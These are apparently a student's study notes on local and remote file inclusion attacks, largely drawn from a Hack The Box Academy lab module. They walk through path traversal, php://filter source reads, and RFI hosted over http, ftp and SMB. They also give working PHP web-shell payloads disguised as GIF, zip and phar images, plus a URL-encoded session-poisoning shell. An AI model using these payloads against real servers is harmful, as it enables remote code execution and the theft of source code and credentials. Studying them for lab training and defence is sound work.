# INtroduction ?

- backend langs : php , js, java
- they use HTTP parameters → to specify what is shown in the web page
- our target is to try to manipulate those paramters .
- to do display the content of any local file on the hosting server : LFI local file inclusion .
- or display the content of our remote file in the hosting server and getting it excuted by the hosting server : RFI remote file inclusion .

## LFI local file inclusion

the LFI vulenrability usually located in the templating engines .

Templating engines: are librarires that produce HTML pages according to a place holder to save effort of making a specified html code for every thing it is usually used in search bars it displayes a page that shows the common static things in the main page like the navigation bar title and so on and then dynamically loads other content that changes betwen pages according to the value the user gives to the place holder ( parameter) .

This is why we often see a parameter like `/index.php?page=about`, where `index.php`  
sets static content (e.g. header/footer), and then only pulls the  
dynamic content specified in the parameter, which in this case may be  
read from a file called `about.php`. As we have control over the `about` portion of the request, it may be possible to have the web application grab other files and display them on the page.

## Read vs Execute

From all of the above examples, we can see that File Inclusion  
vulnerabilities may occur in any web server and any development  
frameworks, as all of them provide functionalities for loading dynamic  
content and handling front-end templates.

The most important thing to keep in mind is that `some of the above functions only read the content of the specified files, while others also execute the specified files`. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.

The following table shows which functions may execute files and which only read file content:

|   |   |   |   |
|---|---|---|---|
|**Function**|**Read Content**|**Execute**|**Remote URL**|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|

This is a significant difference to note, as executing files may  
allow us to execute functions and eventually lead to code execution,  
while only reading the file's content would only let us to read the  
source code without code execution. Furthermore, if we had access to the  
source code in a whitebox exercise or in a code audit, knowing these  
actions helps us in identifying potential File Inclusion  
vulnerabilities, especially if they had user-controlled input going into  
them.

In all cases, File Inclusion vulnerabilities are critical and may  
eventually lead to compromising the entire back-end server. Even if we  
were only able to read the web application source code, it may still  
allow us to compromise the web application, as it may reveal other  
vulnerabilities as mentioned earlier, and the source code may also  
contain database keys, admin credentials, or other sensitive  
information.

## lets learn how ot EXPLOIT LFI vulnerablities ….

- our first target is to be able to read the content of local files on the back-end server .

## basic LFI

- So, if the web application is indeed pulling a file that is now being  
    included in the page, we may be able to change the file being pulled to  
    read the content of a different local file. Two common readable files  
    that are available on most back-end servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows. So, let's change the parameter from `es` to `/etc/passwd`:
    
    [![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang_passwd.png)](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang_passwd.png)
    
    As we can see, the page is indeed vulnerable, and we are able to read the content of the `passwd` file and identify what users exist on the back-end server.
    
    ---
    

## path Traversal

In this case, if we attempt to read `/etc/passwd`, then the path passed to `include()` would be (`./languages//etc/passwd`), and as this file does not exist, we will not be able to read anything:

[![](https://academy.hackthebox.com/storage/modules/23/traversal_passwd_failed.png)](https://academy.hackthebox.com/storage/modules/23/traversal_passwd_failed.png)

As expected, the verbose error returned shows us the string passed to the `include()` function, stating that there is no `/etc/passwd` in the languages directory.

**Note:** We are only enabling PHP errors on this web  
application for educational purposes, so we can properly understand how  
the web application is handling our input. For production web  
applications, such errors should never be shown. Furthermore, all of our  
attacks should be possible without errors, as they do not rely on them.

We can easily bypass this restriction by traversing directories using `relative paths`. To do so, we can add `../` before our file name, which refers to the parent directory. For example, if the full path of the languages directory is `/var/www/html/languages/`, then using `../index.php` would refer to the `index.php` file on the parent directory (i.e. `/var/www/html/index.php`).

So, we can use this trick to go back several directories until we reach the root path (i.e. `/`), and then specify our absolute file path (e.g. `../../../../etc/passwd`), and the file should exist:

[![](https://academy.hackthebox.com/storage/modules/23/traversal_passwd.png)](https://academy.hackthebox.com/storage/modules/23/traversal_passwd.png)

## Basic Bypasses

use url encoding as your second line of attack ( may work only with the old systems while in hte new systems it willnot work at all because of the increase in the definse .

---

total of 4096 characters

  

  

## PHP Filters

- we will see how to read php source code via php filters .
- and we also can get remote code excution .
- php://filter ….. we have 4 different filters in our hands available to be used ..
    1. string filters
    2. conversion filters
    3. compression filters
    4. encryption filters
- we use convert.base64-enode filter from the conversion filters in our LFI attacks

### Lets get into the process of LFI with PHP filters …

1. fuzzing for php files :
    1. ffuf - gobuster we will use the ffuf tool -w -u
    2. /Fuzz.php we are fuzzing for the file of the php that is in the target server
    3. files will appear but we will need to encode them into base64 to make them appear as a txt not be excuted
        
        and this happens by
        
        php://
        
        filter/
        
        read=convert.base64-encode/
        
        resource=config
        
        so the final will be :
        
        `php://filter/read=convert.base64-encode/resource=config`
        
        we will use this in the place of http://ip:port/index.php?language=…[here]….
        
        our target now will be to use php to excute commands on the back-end server to take over the system.
        
          
        
        ## Data
        
        The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`)  
        setting is enabled in the PHP configurations. So, let's first confirm  
        whether this setting is enabled, by reading the PHP configuration file  
        through the LFI vulnerability.
        
        ## How to do RFI attack :
        
        first : start by making a script in the language you are aiming to attack its file .
        
        second: we will start a listener to listen for the data that will be displayed and display it in our terminal , we will open the server via `sudo python3 -m http.server <port>` and now we will have a listener via our python 3 listener in our terminal .
        
        third: now in the place of ? language= we will type here our link that is maliciouse the link will be containing of http not https as that is our listener then our laptop ip that we are hacking through and then the port that we are listening on at python3 listener in our terminal then we will do a “/” then our script that we prepared in the first step if the script is from those who needs the value of cmd then we will use cmd=<our command> . thats it 🙂
        
        ## How to host our RFI script attack on ftb instead of http < which was in the previosse toggle > :
        
        if we found that http is closed we may be still be able to host the attack via the ftp protocol instead of the http protocol but how ?
        
        lets answer..
        
        we will use this instead of the last listener we will use also python not python3 and we will keep using it under the sudo command `sudo python -m pyftpdlib -p <port>`
        
        and as we saw it is a very simple command mainly taking the
        
        sudo
        
        python
        
        -m > to mention the protocol
        
        py==ftp==dlib > the ftp protocol
        
        -p > the port ( because we are using python ==not== 3 here )
        
        and also in the maliciouse link that we put in the ? language= < our maliciouse link > but we will start it by the protocol we are using which will be ftp instead of http .
        
          
        
        important note when dealing with ftp we dont say any port except its main port which is 21 for ftp 22 for ssh and in the maliciouse link we dont say the port only the ip because it is a default thing for ftp to be 21 so no need but in our listener we will use in our python listener -p 21 nothing else .
        
          
        
        after doing all that the php will try to authenticate us as an anonymous user . if the server requires valid authentication , then the credentials will be written in this form if we have it ftp:// < instead of directly putting the ip /shell.php&cmd=ls
        
        we will first type the credintials user:pass@ip/shell.php&cmd=ls> and yeah thats it
        
          
        
          
        
          
        
          
        
        ## If the target server is a windows we can do RFI using smb instead of needing allow_url_include
        
        why? > that is because windows treat all files on remote smb servers as normal files which can be referenced directly wiht a unc path
        
          
        
        because windoows is smb 😄
        
        so lets do the RFI via smb but how to start the smb protocol listener ?
        
        we will use
        
        `impacket-smbserver -smb2support share $(pwd)` so this will be the command o
        
          
        
          
        
        ## LFI and File Uploads :
        
        - mainly we are talking about uploading files in the back end server and if we found that the uploaded image here that contains our maliciouse php content we dont have access to excute or display it which may happen alot we will merge the file upload attack with the local file include vulnerabilty to access the php image and execute it .
        - As mentioned in the first section, the following are the functions  
            that allow executing code with file inclusion, any of which would work  
            with this section's attacks:
            
            |   |   |   |   |
            |---|---|---|---|
            |**Function**|**Read Content**|**Execute**|**Remote URL**|
            |**PHP**||||
            |`include()`/`include_once()`|✅|✅|✅|
            |`require()`/`require_once()`|✅|✅|❌|
            |**NodeJS**||||
            |`res.render()`|✅|✅|❌|
            |**Java**||||
            |`import`|✅|✅|✅|
            |**.NET**||||
            |`include`|✅|✅|✅|
            
            ---
            
              
            
        - ### Crafting Malicious Image
            
            Our first step is to create a malicious image containing a PHP web  
            shell code that still looks and works as an image. So, we will use an  
            allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well. We can do so as follows:
            
            Crafting Malicious Image
            
            ```
            KareemAlsadeq@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
            ```
            
            This file on its own is completely harmless and would not affect  
            normal web applications in the slightest. However, if we combine it with  
            an LFI vulnerability, then we may be able to reach remote code  
            execution.
            
              
            
              
            
            ## Zip Upload
            
            As mentioned earlier, the above technique is very reliable and should  
            work in most cases and with most web frameworks, as long as the  
            vulnerable function allows code execution. There are a couple of other  
            PHP-only techniques that utilize PHP wrappers to achieve the same goal.  
            These techniques may become handy in some specific cases where the above  
            technique does not work.
            
            We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php)  
            wrapper to execute PHP code. However, this wrapper isn't enabled by  
            default, so this method may not always work. To do so, we can start by  
            creating a PHP web shell script and zipping it into a zip archive (named  
            `shell.jpg`), as follows:
            
            Uploaded File Path
            
            ```
            KareemAlsadeq@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
            ```
            
            **Note:** Even though we named our zip archive as  
            (shell.jpg), some upload forms may still detect our file as a zip  
            archive through content-type tests and disallow its upload, so this  
            attack has a higher chance of working if the upload of zip archives is  
            allowed.
            
            Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `\#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:
            
            [![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)
            
            As we can see, this method also works in executing commands through zipped PHP scripts.
            
            **Note:** We added the uploads directory (`./profile_images/`) before the file name, as the vulnerable page (`index.php`) is in the main directory.
            
              
            
              
            
              
            
            ## Phar Upload
            
            Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
            
            Code: php
            
            ```
            <?php
            $phar = new Phar('shell.phar');
            $phar->startBuffering();
            $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
            $phar->setStub('<?php __HALT_COMPILER(); ?>');
            
            $phar->stopBuffering();
            ```
            
            This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
            
            Uploaded File Path
            
            ```
            KareemAlsadeq@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
            ```
            
            Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
            
            [![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)
            
            As we can see, the `id` command was successfully executed. Both the `zip` and `phar`  
            wrapper methods should be considered as alternative methods in case the  
            first method did not work, as the first method we discussed is the most  
            reliable among the three.
            
            **Note:** There is another (obsolete) LFI/uploads  
            attack worth noting, which occurs if file uploads is enabled in the PHP  
            configurations and the `phpinfo()` page is somehow exposed to  
            us. However, this attack is not very common, as it has very specific  
            requirements for it to work (LFI + uploads enabled + old PHP + exposed  
            phpinfo()). If you are interested in knowing more about it, you can  
            refer to [This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).
            
              
            
        
          
        
        ## Log Poisoning:
        
        - our attack now is depending on inputing the php scripts
        - in a place that we have control over its name in the log and thats why its called log > poisoning
        - we found that the name of the sessionid in the cookies field is named according to the input we use in th e?language=..
        - so we will use the name as our language=..<php script> …
        - then this will make the script saved as a name of the PHPSESSID and as we saw we now will use the LFI to read it and as we saw when we read the php script in the language place it gets excuted so we will refer to its path ( the file that is named by the script name ) and then we will give the value of ‘cmd’ with our command that we want it to be excuted via our php script that is already excuted .
        - # Log Poisoning
            
            We have seen in previous sections that if we include any file that  
            contains PHP code, it will get executed, as long as the vulnerable  
            function has the `Execute` privileges. The attacks we will  
            discuss in this section all rely on the same concept: Writing PHP code  
            in a field we control that gets logged into a log file (i.e. `poison`/`contaminate`  
            the log file), and then include that log file to execute the PHP code.  
            For this attack to work, the PHP web application should have read  
            privileges over the logged files, which vary from one server to another.
            
            As was the case in the previous section, any of the following functions with `Execute` privileges should be vulnerable to these attacks:
            
            |   |   |   |   |
            |---|---|---|---|
            |**Function**|**Read Content**|**Execute**|**Remote URL**|
            |**PHP**||||
            |`include()`/`include_once()`|✅|✅|✅|
            |`require()`/`require_once()`|✅|✅|❌|
            |**NodeJS**||||
            |`res.render()`|✅|✅|❌|
            |**Java**||||
            |`import`|✅|✅|✅|
            |**.NET**||||
            |`include`|✅|✅|✅|
            
            ---
            
            ## PHP Session Poisoning
            
            Most PHP web applications utilize `PHPSESSID` cookies,  
            which can hold specific user-related data on the back-end, so the web  
            application can keep track of user details through their cookies. These  
            details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.
            
            The first thing we need to do in a PHP Session Poisoning attack is to  
            examine our PHPSESSID session file and see if it contains any data we  
            can control and poison. So, let's first check if we have a
            
            ```
            PHPSESSID
            ```
            
            cookie set to our session:
            
            [![](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)
            
            As we can see, our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Let's try include this session file through the LFI vulnerability and view its contents:
            
            [![](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)
            
            **Note:** As you may easily guess, the cookie value  
            will differ from one session to another, so you need to use the cookie  
            value you find in your own session to perform the same attack.
            
            We can see that the session file contains two values: `page`, which shows the selected language page, and `preference`, which shows the selected language. The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the `page` value is under our control, as we can control it through the `?language=` parameter.
            
            Let's try setting the value of `page` a custom value (e.g. `language parameter`) and see if it changes in the session file. We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:
            
            Code: url
            
            ```
            http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
            ```
            
            Now, let's include the session file once again to look at the contents:
            
            [![](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)
            
            This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file. Our next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:
            
            Code: url
            
            ```
            http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
            ```
            
            Finally, we can include the session file and use the `&cmd=id` to execute a commands:
            
            [![](https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png)](https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png)
            
            Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`  
            after our last inclusion. Ideally, we would use the poisoned web shell  
            to write a permanent web shell to the web directory, or send a reverse  
            shell for easier interaction.
            
        
          
        
          
        
          
        
        💡
        
        allways start with atleast 4 ../ in your LFI url referal
        
        # Lets Automate LFI : )
        
        - Automated scanning :
        - first method : we can fuzz in the place of the parameter we are targeting using a LFI huge list and then look at the results repsonses of their http .
            - lets get
            - the wordlists used from seclist-master:
                - burp-parameter-names.txt
                    - `Discovery/Web-Content/burp-parameter-names.txt`
                - LFI-Jhaddix.txt
                    - `Fuzzing/LFI/LFI-Jhaddix.txt`
                - default-web-root-directory-linux.txt
                    - `Discovery/Web-Content/default-web-root-directory-linux.txt`